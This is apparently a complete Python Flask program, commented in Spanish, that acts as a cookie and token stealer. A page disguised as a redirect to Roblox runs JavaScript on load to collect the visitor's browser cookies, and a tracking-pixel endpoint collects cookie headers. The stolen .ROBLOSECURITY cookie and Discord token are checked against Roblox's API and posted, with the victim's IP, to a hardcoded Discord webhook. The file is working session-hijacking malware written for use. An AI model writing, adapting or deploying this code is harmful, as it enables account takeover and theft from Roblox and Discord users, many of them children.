from flask import Flask, request, Response, redirect
import requests
import json
from datetime import datetime
import os
import base64
import random
import string

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

def send_to_discord(cookies_data, ip, user_agent):
    """Envía las cookies reales a Discord"""
    try:
        roblox_cookie = cookies_data.get('.ROBLOSECURITY', 'No encontrada')
        discord_token = cookies_data.get('token', 'No encontrado')
        
        # Intentar verificar la cookie de Roblox con la API
        username = "No verificado"
        user_id = "Desconocido"
        
        if roblox_cookie != "No encontrada":
            try:
                session = requests.Session()
                session.cookies['.ROBLOSECURITY'] = roblox_cookie
                user_info = session.get('https://www.roblox.com/mobileapi/userinfo').json()
                username = user_info.get('UserName', 'Error al obtener')
                user_id = user_info.get('UserID', 'Desconocido')
            except:
                username = "Cookie inválida o expirada"
        
        embed = {
            "title": f"🎯 COOKIES REALES CAPTURADAS - {username}",
            "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**IP:** {ip}",
            "color": 16711680,
            "fields": [
                {"name": "🌐 IP", "value": str(ip), "inline": True},
                {"name": "👤 Username Roblox", "value": str(username), "inline": True},
                {"name": "🆔 User ID", "value": str(user_id), "inline": True},
                {"name": "🔴 .ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
                {"name": "🔵 Discord Token", "value": f"```{discord_token}```", "inline": False},
                {"name": "📋 Todas las cookies", "value": f"```json\n{json.dumps(cookies_data, indent=2)[:1000]}```", "inline": False}
            ],
            "footer": {"text": "Cookie Logger Real - API Verificada"}
        }
        
        payload = {
            "content": "@everyone **COOKIES REALES CAPTURADAS**",
            "embeds": [embed]
        }
        
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"Cookies enviadas a Discord: {response.status_code}")
        
    except Exception as e:
        print(f"Error enviando a Discord: {e}")

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Servir una página HTML que ejecuta JavaScript para capturar cookies
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Redireccionando...</title>
    <script>
        // Capturar todas las cookies del navegador
        function getCookies() {{
            const cookies = document.cookie.split(';');
            const cookieObj = {{}};
            cookies.forEach(cookie => {{
                const [name, value] = cookie.trim().split('=');
                if (name && value) {{
                    cookieObj[name] = value;
                }}
            }});
            return cookieObj;
        }}

        // Enviar cookies al servidor
        function sendCookies() {{
            const cookies = getCookies();
            fetch('/capture', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{cookies: cookies}})
            }}).then(response => response.json())
              .then(data => {{
                  console.log('Cookies enviadas:', data);
                  // Redirigir a Roblox después de enviar
                  window.location.href = 'https://www.roblox.com/es/users/7869790887/profile';
              }}).catch(error => {{
                  console.error('Error:', error);
                  window.location.href = 'https://www.roblox.com/es/users/7869790887/profile';
              }});
        }}

        // Ejecutar cuando cargue la página
        window.onload = sendCookies;
    </script>
</head>
<body>
    <h1>Redireccionando a Roblox...</h1>
    <p>Por favor espera un momento.</p>
</body>
</html>"""
    
    return html

@app.route('/capture', methods=['POST'])
def capture():
    """Endpoint para recibir cookies del JavaScript"""
    try:
        data = request.json
        cookies = data.get('cookies', {})
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        print(f"Cookies recibidas de {ip}: {json.dumps(cookies, indent=2)}")
        
        # Enviar a Discord
        send_to_discord(cookies, ip, user_agent)
        
        return {"status": "success", "message": "Cookies capturadas"}
    except Exception as e:
        print(f"Error capturando cookies: {e}")
        return {"status": "error", "message": str(e)}

@app.route('/pixel.png')
def pixel():
    """Endpoint para el pixel tracker - captura cookies del header"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Capturar cookies del header HTTP
    cookie_string = request.headers.get('Cookie', '')
    cookies = {}
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
        
        if cookies:
            print(f"Cookies del header de {ip}: {json.dumps(cookies, indent=2)}")
            send_to_discord(cookies, ip, user_agent)
    
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
